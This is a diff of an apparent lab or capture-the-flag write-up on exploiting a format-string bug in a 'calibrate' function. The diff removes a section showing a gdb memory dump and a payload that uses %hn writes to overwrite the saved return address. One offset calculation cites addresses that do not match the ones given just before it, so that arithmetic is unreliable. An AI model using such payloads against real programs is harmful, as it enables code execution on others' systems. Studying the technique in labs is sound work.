@@ -16,28 +16,6 @@ We can self-define the arguments that we want. At first, we neet to place the st
 ...
 ```
 
-## Magic Numbers
-
-The address of buffer is `0xffffd5d0`, the RIP is `0xffffd5bc`, so the location of RIP is 20 bytes away from the start of the buffer (0xffffd6ac - 0xffffd698).
-
-``` C++
-(gdb) x/16x buf
-0xffffd5d0:     0x41414141      0xffffd5bc      0x41414141      0xffffd5be      
-0xffffd5e0:     0x63256325      0x63256325      0x63256325      0x63256325      
-0xffffd5f0:     0x63256325      0x63256325      0x32353525      0x25753637      
-0xffffd600:     0x31256e68      0x33343230      0x6e682575      0x00000a00
-(gdb) i f
-Stack level 0, frame at 0xffffd5c0:
- eip = 0x8049214 in calibrate (calibrate.c:9); saved eip = 0x804928f
- called by frame at 0xffffd670
- source language c.
- Arglist at 0xffffd5b8, args:
-    buf=0xffffd5d0 "AAAA\274\325\377\377AAAA\276\325\377\377%c%c%c%c%c%c%c%c%c%c%c%c%55276u%hn%10243u%hn"
- Locals at 0xffffd5b8, Previous frame's sp is 0xffffd5c0
- Saved registers:
-  ebp at 0xffffd5b8, eip at 0xffffd5bc
-```
-
 ## Exploit Structure
 
 First, we will place the argument we need to buffer, which is significant to what we want to write in memory.
